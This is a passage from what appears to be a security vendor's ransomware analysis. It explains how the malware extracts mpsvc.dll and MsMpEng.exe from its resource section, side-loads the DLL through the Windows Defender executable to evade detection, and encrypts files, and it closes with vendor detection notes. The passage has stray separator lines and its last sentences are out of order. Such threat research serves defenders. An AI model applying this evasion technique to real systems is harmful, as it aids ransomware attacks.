+Both mpsvc.dll and MsMpEng.exe are found within the ransomware in the resource section of the file. To access the content of the resource section of the file, the ransomware uses FindResourceW, LoadResource, and LockResource APIs to grab the contents of the resource section. The resource section has two main elements, “MODLIS” and “SOFTIS”. These provide the contents for “mpsvc.dll” and “MsMpEng.exe”, respectively (Figure 7a).
+:\/:
+The ransomware tries to access “mpsvc.dll” in the “C:\Windows” folder. If it fails, it will create “mpsvc.dll” in “AppData\Local\Temp”. 
+:\/:
+Similar steps are taken to drop the MsMpEng.exe to the Temp folder. Afterwards, the malware initiates its DLL Side-Loading technique by executing MsMpEng.exe using the CreateProcessW API.
+:\/:
+Executing MsMpEng.exe on its own is not malicious, but MsMpEng loads the malicious “mpsvc.dll” as one of the needed libraries. The application is not able to tell whether the loaded library is malicious. So, once the malicious library is loaded, it executes the encryption of files along with the rest of its infection routines.
+:\/:
+This ransomware variant drops a copy of its ransom note file, “<random string>-readme.txt”, in every accessible folder. It then tries to encrypt as many files as it can, giving encrypted files an extension name similar to the random string in the ransom note file name.
+:\/:
+It also uses the Windows Defender executable, MsMpEng.exe, to avoid detection, but it side-loads the malicious library, “mpsvc.dll”, to employ its payload. The future variant of this ransomware might use a different valid executable, but so far, we have only observed MsMpEng.exe.
+:\/:
+There are different variants of this ransomware where the strings, including the ransom note and C&Cs, are encrypted using randomized keys within its code. But once these strings are decrypted, they are nearly the same with some minor differences, such as the randomized string for the extension name of the encrypted files. 
+:\/:
+Lastly, it is important to remind individuals and teams tasked with identifying and responding to threats that there are many evasion techniques that threat actors can use to circumvent security controls, and they continue to evolve. Organizations are advised to likewise evolve their security controls to ensure they can effectively fend off the latest threats. To that end, it is helpful to keep in mind that even though these threats are becoming increasingly sophisticated, they still tend to be noisy, and a good monitoring solution can go a long way towards interrupting the attack chain.  
+:\/:
+FortiEDR detects and blocks the DLL side-loading event of this ransomware when agent.exe executes MsMpEng.exe (Windows Defender) and loads the mpsvc.dll (malicious library) payload. In addition, all published IOCs have been added to our 
+:\/:
+. The Fortinet AntiVirus engine is a part of each of those solutions as well. As a result, customers who have these products with up-to-date protections are protected.
+:\/:
+ threat research and intelligence organization and the FortiGuard Security Subscriptions and Services 
+:\/:
